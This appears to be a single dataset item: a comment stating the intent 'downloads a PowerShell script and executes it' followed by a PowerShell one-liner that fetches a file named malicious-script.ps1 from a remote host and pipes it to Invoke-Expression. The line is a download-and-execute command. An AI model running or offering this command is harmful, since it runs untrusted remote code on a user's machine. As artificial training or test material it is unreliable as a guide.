# Natural language intent:
# Downloads a PowerShell script using cURL and executes it using Invoke-Expression.

Invoke-Expression -Command "curl http://host.com/malicious-script.ps1 | iex"
